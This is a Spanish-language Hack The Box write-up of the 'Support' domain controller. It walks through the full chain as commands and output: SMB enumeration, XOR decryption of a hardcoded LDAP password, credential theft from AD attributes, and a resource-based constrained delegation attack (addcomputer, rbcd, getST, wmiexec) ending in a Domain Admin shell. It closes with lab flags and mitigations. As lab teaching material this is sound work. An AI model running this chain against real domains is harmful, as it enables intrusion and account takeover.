# Support — Hack The Box Writeup

| Campo | Valor |
|---|---|
| **Máquina** | Support (Windows Server 2022 — Domain Controller) |
| **Plataforma** | HackTheBox |
| **Fecha** | 2026-08-24 |
| **user.txt** | `fee57b2e4d7fc62c318d68259483e4cd` |
| **root.txt** | `8d441ff54dd23098e1ee97e54f04233c` |

## TL;DR

Cadena de ataque en cuatro actos sobre Active Directory:

1. **Share SMB legible por anónimos** → binario .NET custom (`UserInfo.exe`) con credenciales LDAP cifradas embebidas.
2. **Criptografía rota (XOR hardcodeado)** → recuperación de la contraseña de la cuenta `ldap` mediante desensamblado IL.
3. **Contraseña documentada en el propio AD** → atributo `info` del usuario `support` → WinRM.
4. **ACL abusiva (GenericAll sobre la cuenta del DC)** → Resource-Based Constrained Delegation → ticket como `Administrator` → Domain Admin.

---

## 1. Reconocimiento

```bash
nmap -Pn -n -sT --open --min-rate 5000 -p- 10.129.107.170 -oG allPorts
nmap -Pn -n -sT -sC -sV -p53,88,135,139,445,389,464,593,636,3268,3269,5985,9389 10.129.107.170
```

```
53/tcp   domain          Simple DNS Plus
88/tcp   kerberos-sec    Microsoft Windows Kerberos
135/tcp  msrpc           Microsoft Windows RPC
389/tcp  ldap            Domain: support.htb
445/tcp  microsoft-ds    SMB (signing enabled)
5985/tcp wsman           Microsoft HTTPAPI (WinRM)
Service Info: Host: DC; OS: Windows
```

Perfil inequívoco de **Domain Controller**: Kerberos (88) + LDAP/GC (389/3268) + DNS (53). Hostname `DC`, dominio `support.htb`.

```bash
echo "10.129.107.170 support.htb dc.support.htb" | sudo tee -a /etc/hosts
```

### 1.1 Enumeración de usuarios vía Kerberos (sin credenciales)

El KDC responde distinto si un principal existe (`PREAUTH_REQUIRED`) o no (`PRINCIPAL_UNKNOWN`) → oráculo de usernames:

```bash
nmap -p 88 --script krb5-enum-users \
  --script-args 'krb5-enum-users.realm=support.htb,users={administrator,guest,krbtgt,support}' 10.129.107.170
# Discovered: guest@support.htb, administrator@support.htb
```

> Escalar esta técnica con `kerbrute` y wordlists grandes permite mapear usuarios completos del dominio sin autenticación.

---

## 2. Foothold

### 2.1 Share SMB anónima con herramientas internas

```bash
smbclient -N -L //10.129.107.170
# support-tools   Disk   "support staff tools"   ← share custom, READ para guest
```

Entre software portable genérico destaca un archivo propio de fecha posterior:

```
UserInfo.exe.zip   277KB   Jul 2022
```

### 2.2 Análisis del binario .NET

`UserInfo.exe` es un ensamblado .NET de 12KB que consulta LDAP. Los strings UTF-16 revelan los secretos:

```bash
strings -el UserInfo.exe | grep -iE "ldap|password"
```

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E   ← password cifrada (base64)
armando                                             ← clave de cifrado hardcodeada
support\ldap                                        ← usuario LDAP
LDAP://support.htb
```

### 2.3 Recuperación del algoritmo vía desensamblado IL

Con `dnfile` + `dncil` se extrae el IL del método `UserInfo.Services.Protected.getPassword()`:

```
ldloc.1 / ldloc.2 / ldelem.u1        ; data[i]
ldsfld key / ldlen / rem / ldelem.u1 ; key[i % len]
xor                                   ; XOR con clave
ldc.i4 223                            ; ← constante oculta: segundo XOR 0xDF
xor
conv.u1
```

Algoritmo recuperado: `plain[i] = cipher[i] ^ key[i % len(key)] ^ 0xDF`

```python
import base64
enc = base64.b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
key = b'armando'
print(bytes(b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(enc)).decode())
# nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

> 🔑 **Vulnerabilidad #1 — Clave de cifrado hardcodeada (CWE-321)**: ofuscar credenciales en un binario distribuible no es cifrado. Cualquier empleado con acceso al share recupera la clave.

### 2.4 La contraseña está en el propio Active Directory

Con las credenciales `support\ldap` consultamos atributos completos de los usuarios. El usuario `support` tiene su contraseña documentada en el atributo no estándar `info`:

```python
from ldap3 import Server, Connection, NTLM
c = Connection(Server('10.129.107.170'), user='SUPPORT\\ldap',
               password='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz', authentication=NTLM)
c.bind()
c.search('DC=support,DC=htb', '(objectClass=user)',
         attributes=['sAMAccountName','description','info','comment'])
# support → info: "Ironside47pleasure40Watchful"
```

> 🔑 **Vulnerabilidad #2 — Contraseñas en atributos del directorio (CWE-260)**: el AD es legible por cualquier usuario autenticado; nunca almacenar secretos en `description`, `info` o comentarios.

### 2.5 Acceso por WinRM

`support` pertenece al grupo *Remote Management Users*:

```bash
nxc winrm 10.129.107.170 -u support -p 'Ironside47pleasure40Watchful'
# [+] support.htb\support:... (Pwn3d!)

nxc winrm 10.129.107.170 -u support -p '...' \
  -x 'type C:\Users\support\Desktop\user.txt'
# fee57b2e4d7fc62c318d68259483e4cd
```

---

## 3. Escalada de privilegios

### 3.1 BloodHound: mapeo de ACLs

```bash
bloodhound-python -c All,Acl -u support -p 'Ironside47pleasure40Watchful' \
  -d support.htb -dc dc.support.htb -ns 10.129.107.170
```

Filtrando las ACEs cuyo PrincipalSID es el del usuario `S-1-5-21-...-1105` o su grupo `Shared Support Accounts` (`...-1103`):

```
[!] DC.SUPPORT.HTB  <-  GenericAll  (SHARED SUPPORT ACCOUNTS)
```

**GenericAll sobre la cuenta de equipo del Domain Controller.**

> 🔑 **Vulnerabilidad #3 — ACL peligrosa (CWE-250)**: conceder control total sobre objetos críticos del dominio a grupos operativos habilita ataques de delegación.

### 3.2 Resource-Based Constrained Delegation (RBCD)

`GenericAll` sobre `DC$` permite escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`. Necesitamos una cuenta de equipo bajo nuestro control — cualquier usuario puede crear una por defecto (`ms-DS-MachineAccountQuota=10`):

**Paso 1 — crear cuenta de máquina:**
```bash
addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' \
  -dc-ip 10.129.107.170 -computer-name EVILPC -computer-pass 'EvilPass123!'
# [*] Successfully added machine account EVILPC$
```

**Paso 2 — configurar la delegación hacia DC$:**
```bash
rbcd.py "support.htb/support:Ironside47pleasure40Watchful" -dc-ip 10.129.107.170 \
  -action write -delegate-to 'DC$' -delegate-from 'EVILPC$'
# [*] EVILPC$ can now impersonate users on DC$ via S4U2Proxy
```

**Paso 3 — suplantar a Administrator (S4U2Self + S4U2Proxy):**
```bash
getST.py -spn cifs/DC.support.htb -impersonate administrator \
  -dc-ip 10.129.107.170 "support.htb/EVILPC\$:EvilPass123!"
# [*] Saving ticket in administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

> El servicio `cifs` cubre SMB → ejecución remota de comandos.

**Paso 4 — shell como Administrator:**
```bash
KRB5CCNAME=$PWD/administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache \
wmiexec.py -k -no-pass -target-ip 10.129.107.170 support.htb/administrator@dc.support.htb whoami
# support\administrator
```

### 3.3 Root flag

```
type C:\Users\Administrator\Desktop\root.txt
8d441ff54dd23098e1ee97e54f04233c
```

---

## 4. Resumen de vulnerabilidades

| # | Vulnerabilidad | CWE | Impacto |
|---|---|---|---|
| 1 | Clave de cifrado hardcodeada en binario distribuido | CWE-321 | Recuperación de credenciales LDAP |
| 2 | Contraseña en atributo `info` del AD | CWE-260 | Compromiso de cuenta con WinRM |
| 3 | GenericAll sobre cuenta del DC | CWE-250 | RBCD → Domain Admin |
| — | Machine Account Quota por defecto (10) | CWE-284 | Permite crear cuentas para RBCD |
| — | Share `support-tools` legible por anónimos | CWE-276 | Exposición de binarios internos |

## 5. Mitigaciones recomendadas

- Auditar ACLs periódicamente (BloodHound/SharpHound); eliminar GenericAll/WriteDacl de grupos operativos sobre objetos críticos.
- Establecer `ms-DS-MachineAccountQuota = 0` si no es necesario crear equipos por cuenta de usuario.
- Barrer atributos `info`/`description` del directorio en busca de secretos (herramientas tipo *PingCastle*).
- No distribuir binarios con claves embebidas; usar secret managers y autenticación mutua.
- Restringir acceso anónimo a shares y activar auditoría de accesos a `SYSVOL`-like shares custom.

## 6. Artefactos

- `scripts/xor_recover.py` — descifrado XOR+base64 del binario
- `scripts/ldap_info_dump.py` — consulta LDAP de atributos ocultos
- `scripts/rbcd_chain.sh` — cadena completa addcomputer→rbcd→getST
